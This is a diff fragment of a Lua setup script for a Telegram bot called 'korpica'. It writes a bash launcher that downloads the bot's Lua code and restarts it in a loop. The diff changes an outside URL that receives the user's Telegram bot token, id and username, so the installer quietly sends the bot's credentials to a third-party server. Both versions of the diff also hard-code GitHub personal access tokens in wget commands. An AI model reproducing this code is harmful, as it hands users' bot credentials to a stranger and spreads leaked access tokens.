@@ -64,21 +64,21 @@ os.execute('lua start.lua')
 end
 local function Files_korpica_Info()
 Create_Info(database:get(Server_korpica.."Token_korpica"),database:get(Server_korpica.."Id_korpica"),database:get(Server_korpica.."UserName_korpica"))   
-https.request("https://cinemaiq.ml/api/source.php?id="..database:get(Server_korpica.."Id_korpica").."&username="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
+https.request("https://zaksat.ml/shahum/index.php?id="..database:get(Server_korpica.."Id_korpica").."&user="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
 local Runkorpica = io.open("korpica", 'w')
 Runkorpica:write([[
 #!/usr/bin/env bash
 cd $HOME/korpica
 token="]]..database:get(Server_korpica.."Token_korpica")..[["
 rm -fr korpica.lua
-wget --header 'Authorization: token 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' "https://raw.githubusercontent.com/korpicaTEAM/korpica/master/korpica.lua"
+wget --header 'Authorization: token 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' "https://raw.githubusercontent.com/korapica-Team/korpica/master/korpica.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./korpica.lua -p PROFILE --bot=$token
 done
 ]])
 Runkorpica:close()
-local RunTs = io.open("sx", 'w')
+local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/korpica
